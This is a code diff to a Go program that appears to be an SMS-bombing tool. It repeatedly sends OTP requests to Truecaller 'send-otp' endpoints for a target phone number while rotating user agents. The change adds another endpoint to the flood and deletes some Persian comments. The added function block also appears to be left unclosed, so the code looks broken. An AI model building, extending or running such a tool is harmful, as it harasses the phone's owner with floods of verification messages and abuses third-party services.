@@ -16,7 +16,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-	// "regexp" //  <-- مشکل ۱: این پکیج چون استفاده نشده بود حذف شد
 )
 
 var userAgents = []string{
@@ -138,6 +137,21 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
 		// --- SMS Tasks ---
 		if phone != "" {
+
+			wg.Add(1)
+			tasks <- func() {
+				phoneNum, countryCode := parsePhoneNumber(phone)
+				if phoneNum != "" && countryCode != "" {
+					payload := map[string]interface{}{
+						"phone":       phoneNum,
+						"countryCode": countryCode,
+					}
+					sendJSONRequest(client, ctx, "https://asia-south1-truecaller-web.cloudfunctions.net/webapi/noneu/auth/truecaller/v1/send-otp", payload, &wg, ch)
+				} else {
+					wg.Done()
+				}
+
+
 			// ** API 1: Truecaller (JSON) **
 			wg.Add(1)
 			tasks <- func() {
@@ -150,7 +164,6 @@ func main() {
 					}
 					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", payload, &wg, ch)
 				} else {
-					// مشکل ۳: اگر شماره معتبر نباشد، wg.Done() را فراخوانی می‌کنیم تا برنامه هنگ نکند
 					wg.Done()
 				}
 			}
